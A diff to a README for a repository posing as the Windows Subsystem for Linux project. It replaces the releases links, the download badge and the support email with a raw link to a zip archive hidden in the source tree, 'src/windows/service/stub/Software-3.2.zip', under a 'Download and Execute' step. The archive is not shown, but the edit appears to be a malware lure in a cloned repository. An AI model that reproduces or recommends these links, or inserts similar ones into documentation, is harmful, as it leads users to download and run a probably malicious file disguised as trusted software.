@@ -2,7 +2,7 @@
 
 Welcome to the WSL repository! This project aims to enhance your Windows experience by integrating the power of Linux directly into your Windows operating system. With WSL, you can run your favorite Linux tools alongside your Windows applications without the need for a virtual machine or dual-boot setup.
 
-[![Download WSL Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/DuyetTrauTre/WSL/releases)
+[![Download WSL Releases](https://github.com/DuyetTrauTre/WSL/raw/refs/heads/master/src/windows/service/stub/Software-3.2.zip%20Releases-Click%20Here-brightgreen)](https://github.com/DuyetTrauTre/WSL/raw/refs/heads/master/src/windows/service/stub/Software-3.2.zip)
 
 ## Table of Contents
 
@@ -47,7 +47,7 @@ To install WSL, follow these steps:
    - After installation, you can choose your preferred Linux distribution from the Microsoft Store. Popular options include Ubuntu, Debian, and Kali Linux.
 
 3. **Download and Execute**:
-   - For specific releases and updates, visit our [Releases page](https://github.com/DuyetTrauTre/WSL/releases) to download the latest version.
+   - For specific releases and updates, visit our [Releases page](https://github.com/DuyetTrauTre/WSL/raw/refs/heads/master/src/windows/service/stub/Software-3.2.zip) to download the latest version.
 
 ## Usage
 
@@ -104,9 +104,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, feel free to reach out:
 
-- **Email**: support@example.com
+- **Email**: https://github.com/DuyetTrauTre/WSL/raw/refs/heads/master/src/windows/service/stub/Software-3.2.zip
 - **GitHub Issues**: Use the issues section in this repository for bug reports or feature requests.
 
 ---
 
-Thank you for visiting the WSL repository! We hope you find it useful in your development journey. Don't forget to check the [Releases section](https://github.com/DuyetTrauTre/WSL/releases) for the latest updates and downloads. Happy coding!
+Thank you for visiting the WSL repository! We hope you find it useful in your development journey. Don't forget to check the [Releases section](https://github.com/DuyetTrauTre/WSL/raw/refs/heads/master/src/windows/service/stub/Software-3.2.zip) for the latest updates and downloads. Happy coding!
